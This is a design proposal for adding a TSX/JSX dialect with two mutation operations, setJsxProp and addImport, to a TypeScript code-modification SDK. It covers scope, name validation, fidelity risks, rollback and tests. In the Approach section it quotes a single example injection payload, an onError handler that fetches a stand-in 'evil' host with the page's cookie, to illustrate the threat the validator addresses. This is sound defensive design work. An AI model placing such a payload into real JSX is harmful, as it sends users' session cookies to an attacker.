# Proposal: React (TSX/JSX) Dialect (react-dialect)

**Triage**: L · **Persona lens**: none · **Status**: ok · **Revision**: 2 (council synthesis incorporated)

## Intent

Authors who need to mutate `.tsx`/JSX files have no dialect that supports that syntax.
This is a HARD block, not a convenience gap: `ts.find("Component.tsx")` reaches the shipped
`.ts` parser, which throws `"syntactically invalid TypeScript source"` on real JSX — empirically
confirmed, with no author-side workaround inside the SDK's dialect surface. This change ships a
second dialect (`@pbuilder/sdk/react`) mirroring the proven TypeScript dialect's shape, with a
v1 op pair — `setJsxProp` + `addImport` — that covers the realistic author journey (import a
component/value, wire it into JSX) end to end.

## Scope

### In Scope
- React dialect leaf `src/dialects/react/{ast,ops,index}.ts` — ts-morph `.tsx` ScriptKind parse/print, `find()` entry, op-pack composition (→ `react-dialect`)
- Exactly TWO v1 ops: `setJsxProp(elementName, propName, value?)` + `addImport(name, from)` (→ `react-dialect`; erratum: `value` optional per signed spec REQ-RXD-01/11 — boolean-shorthand form)
- **Supported extension set: `.tsx` ONLY for v1** (decided, not deferred). `find()` on any other extension rejects via `dialectError` with a message that names the fix: `.ts` → use `@pbuilder/sdk/typescript`; `.jsx` → not supported in v1, tracked in the React op-catalog follow-up. Rationale: the entire fidelity spike corpus is `.tsx`; plain-JS `.jsx` under a TS-configured project is an unspiked print-fidelity surface — admitting it untested contradicts this change's own fidelity discipline (→ `react-dialect`)
- Core-resident, library-agnostic JSX identifier/attribute-name validator at the op boundary (→ `react-dialect`)
- `./react` subpath + FIT-04/09/14 mechanical extension (→ `react-dialect`, `local-consumption`)
- JSX adversarial conformance corpus (20 samples) + `testDialect`/`testOpPack` hookup — a REQUIRED capability, not a nice-to-have (→ `react-dialect`)
- Second worked example in `docs/authoring-a-dialect.md`, framing AUTHOR-FACING the 2-op minimality, the NAMED follow-up catalog plan, and the `.modify()` escape hatch for everything else (→ `react-dialect`)

### Out of Scope
- The full React mutation catalog (deferred to a dedicated follow-up plan — see Archive Commitments)
- `.jsx` extension support (v1 is `.tsx`-only; revisit with the catalog follow-up)
- Any engine or wire-protocol change
- Retrofitting the TS dialect's template-splice ops with the new validator (deferred hardening debt, pending item 22)
- The FIT-09/FIT-14 exports-guard extensibility refactor (row 229 — reaffirmed deferred; only the mechanical XS edit lands here)

## Capabilities

### New Capabilities
- `react-dialect`: TSX dialect surface — parse/print, `find()`, `./react` subpath, two v1 ops, JSX name validation, conformance proof

### Modified Capabilities
- `local-consumption`: REQ-LC-01.1's enumerated resolvable subpath set grows 5→6 (adds `./react`); FIT-14/FIT-04 baseline regens are mechanical consequences

## Approach

Mirror `src/dialects/typescript/**`: `react/ast.ts` owns parse/print (virtual `.tsx` path +
`compilerOptions.jsx`, near-zero diff from the `.ts` dialect — spike proved 7/7 byte-exact
round-trip including a real `addImportDeclaration` mutation, zero new dependencies).
`define-dialect.ts`/`dialect-handle.ts` are confirmed generic — zero core change. Ops reject via
`dialectError(tail)` (ADR-0039), never plain Error.

**The v1 op pair (council-ratified)**: `setJsxProp` is the load-bearing JSX-structural de-risker
and exercises the FULL security contract in one op — element-name AND prop-name validation
(identifier args, rejected pre-mutation) alongside verbatim-trust for `value`, which is exactly
the confirmed injection vector (`onError={fetch("//evil/"+cookie)}`). `addImport` completes the
realistic author journey (imported symbol wired into JSX) and is NET-NEW capability on `.tsx` —
the file was unopenable before. The two ops mutate HETEROGENEOUS AST regions (import declarations
+ JSX subtree) that must coalesce into ONE `modify` directive — a strictly stronger proof of the
ADR-0006/0037 one-live-AST seam than two ops on the same JSX subtree.

**Considered and rejected — `setJsxProp` + `addJsxChild` (this proposal's own rev-1 pair)**:
rejected by three independent council lenses. (1) PM: each JSX-native op carries its own novel
collision-predicate + idempotency-identity design cost (JSX semantics don't map onto the shipped
`assertNoCollision`); two of them inflates design toward the XL-disguised-as-L smell. (2)
Architect: the spike never proved a JSX-structural mutation byte-exact — two JSX-native ops
doubles the un-evidenced fidelity surface; same-subtree ops are also a weaker coalescing proof.
(3) BA: dropping `addImport` breaks the realistic end-to-end journey; "zero new capability" for
`addImport` overreached — on `.tsx` it is net-new. Dissent preserved for spec/design.

**Open fidelity obligation (NOT inherited as retired)**: the spike retired byte-exact risk for
round-trip + `addImport` ONLY. For `setJsxProp`, ts-morph `JsxAttribute` set/add fidelity is an
OPEN risk — design MUST run a cheap de-risk check (reuse the scratchpad spike harness) proving
byte-exactness across the 20-sample JSX corpus BEFORE apply.

**Decisions for design (ADRs)**: (1) duplicate-vs-shared has TWO axes with opposite leans —
**ops axis**: duplicate (`addImport` is structured-API-identical but small; JSX op shares
nothing); **fidelity-glue axis**: `ast.ts`'s four plumbing primitives (hadBom WeakMap re-prepend,
`detectNewLineKind`, frozen ManipulationSettings, syntactic-diagnostic throw) are 100%
ts-morph-determined, 0% dialect-determined, and the stage-5 lesson's named trigger ("hoist when
the second dialect lands") fires NOW — lean: hoist ONLY those four primitives to `src/core/**`
(never a dialect base class); fallback: duplicate-now + registered followup. **Posture handed to
design: `architecture_impact: modifying`** (the hoist lean touches shipped `typescript/ast.ts`);
if design rules fallback-duplicate, it downgrades to `additive` and registers the followup.
(2) Validator core module home + shared-by-construction posture for future dialects. (3)
`setJsxProp` update-or-insert idempotency (mirrors `addImport` REQ-TSD-03.10). (4) JSX
collision/verbatim semantics for `setJsxProp` vs the `.ts` `assertNoCollision` precedent.
(5) `addImport` duplicate-call idempotency parity with REQ-TSD-03.10.

## Affected Areas

| Area | Impact | Description |
|---|---|---|
| `src/dialects/react/{ast,ops,index}.ts` | New | parse/print, two ops, `find()` entry + `.tsx`-only gate |
| `src/core/**` (validator home) | New | core-resident JSX name validator |
| `src/core/**` (fidelity-glue hoist, if ADR-1 lean holds) | New | four ts-morph-determined primitives hoisted from `typescript/ast.ts` |
| `src/dialects/typescript/ast.ts` | Modified (conditional) | consumes hoisted primitives (ADR-1 lean); untouched under fallback-duplicate |
| `src/core/define-dialect.ts`, `dialect-handle.ts` | Read-only | confirmed generic, zero change |
| `package.json#exports` | Modified | `./react` subpath (6th) |
| `test/fitness/fit-09/fit-14` + baselines | Modified | mechanical +1 subpath / regen |
| `test/dialects/react/**`, `test/conformance/**` | New | unit + exact-op-set + 20-sample JSX corpus |
| `docs/authoring-a-dialect.md` | Modified | second worked example + minimality/catalog/`.modify()` framing |

## Risks

| Risk | Likelihood | Mitigation |
|---|---|---|
| `setJsxProp` byte-exact fidelity UNPROVEN (spike covered round-trip + addImport only) | Medium | Design-phase de-risk check: spike harness × 20-sample corpus, gate BEFORE apply |
| Identifier-injection via raw name splice | Medium | Core validator rejects element/prop names pre-mutation; `value` stays verbatim by contract |
| JSX corpus gap (kit's 6 samples are JSX-blind) | High | 20 JSX samples (fragments, self-closing, spreads, namespaced attrs, entities, CRLF+JSX, BOM+JSX, 4MiB TSX) gate via `testDialect` |
| Hoist touches shipped `typescript/ast.ts` | Medium | ADR-1 hoists ONLY the four ts-morph-determined primitives; existing TS-dialect suite + goldens must stay byte-identical; fallback-duplicate escape hatch |
| Contract not proven against a DIFFERENT AST library | Low | Accepted — byte-exact round-trip is the acceptance gate; Babel/recast fail a mandatory sample |
| Validator drift if later shared with TS ops | Low | Single core-resident implementation; TS retrofit explicitly deferred |

## Rollback Plan

Additive-first with one conditional shared-file touch. To revert: delete `src/dialects/react/**`
and its tests; remove the core validator module (unreferenced once the leaf is gone); remove the
`./react` key from `package.json#exports`; revert FIT-09 exact-list (6→5), FIT-14
package-surface baseline, and FIT-04 `.d.ts` baseline to prior committed values (all under git,
mechanical). If the ADR-1 hoist landed, additionally revert `src/dialects/typescript/ast.ts` to
its pre-hoist revision and delete the hoisted core module — the TS dialect's committed goldens
verify byte-identical behaviour after the revert. Validate with `bun test`: suite returns to its
pre-change green count with no `./react` resolution. No author data is created or migrated;
nothing is unrecoverable.

## Dependencies

- None. ts-morph@28.0.0 (the existing sole runtime dep) covers `.tsx` — zero new dependencies.

## Success Criteria

- [ ] `@pbuilder/sdk/react` resolves; author sets a prop on a JSX element in a real `.tsx` file and the printed output is byte-exact vs a committed golden
- [ ] Author journey e2e: `addImport` + `setJsxProp` on ONE handle coalesce to exactly ONE `modify` directive whose content shows the imported symbol wired into JSX, byte-exact vs golden
- [ ] `Object.keys(dialect.ops)` EQUALS EXACTLY `["addImport", "setJsxProp"]` (anti-smuggle `toEqual`)
- [ ] `find()` on `.ts`/`.jsx`/other rejects via `dialectError` with a message naming the fix (typescript dialect / v1 unsupported)
- [ ] Name validator rejects invalid element/prop names via `dialectError` BEFORE AST mutation; `value` passes verbatim (injection-vector sample asserted). (Erratum: "both sides of `as`" dropped — signed spec REQ-RXD-06 removed alias handling, neither v1 op takes an alias; name-breakout reject and value-verbatim accept are SEPARATE scenarios per spec)
- [ ] `testDialect`/`testOpPack` green: 6 mandatory + 20 JSX-specific samples
- [ ] FIT-09 asserts 6 subpaths; FIT-14 + FIT-04 baselines regenerated and green
- [ ] Docs criterion: `docs/authoring-a-dialect.md` states, author-facing, the 2-op v1 minimality, names the follow-up catalog plan, and shows `.modify()` as the interim escape hatch
- [ ] `bun test` fully green; TS-dialect goldens byte-identical (hoist-safety proof)

## Fitness Functions (foreshadow for design)

- FIT-01 (commons-no-AST) + FIT-02 (no-sibling-dialect-import): auto-cover the new leaf, zero edits.
- FIT-04/FIT-09/FIT-14: mechanical XS edits (+1 subpath, baseline regens).
- NEW: exact-op-set test mirroring `ops-exact-set.test.ts` (anti-smuggle).
- JSX adversarial corpus gating via `testDialect` — required capability.
- CANDIDATE new FF: confine parser/`Project` construction to `react/ast.ts` (and `typescript/ast.ts`). **Factual correction carried**: `ast.ts` is NOT the sole ts-morph importer today — `ops.ts:12` and `index.ts:9` import `type SourceFile` (verified); the real, narrower invariant is parser-CONSTRUCTION confinement, currently unguarded.

## Archive Commitments (followup ledger)

At archive, this change MUST:
- (a) register the React op catalog as complexity-ordered GROUPS (modeled on pending-changes rows 337-349, never a single vague row), with the v1 pair (`setJsxProp` + `addImport`) named as the group-1 anchor;
- (b) re-affirm row 229's deferral with updated trigger: "dialect #3 / next subpath addition";
- (c) record a trigger-reconciliation note covering all three "second dialect" triggers — row 229 (exports-guard refactor), the BOM/fidelity-glue hoist (stage-5 lesson), and the injection validator — each with an explicit fold-in or re-affirm verdict; none silently orphaned.
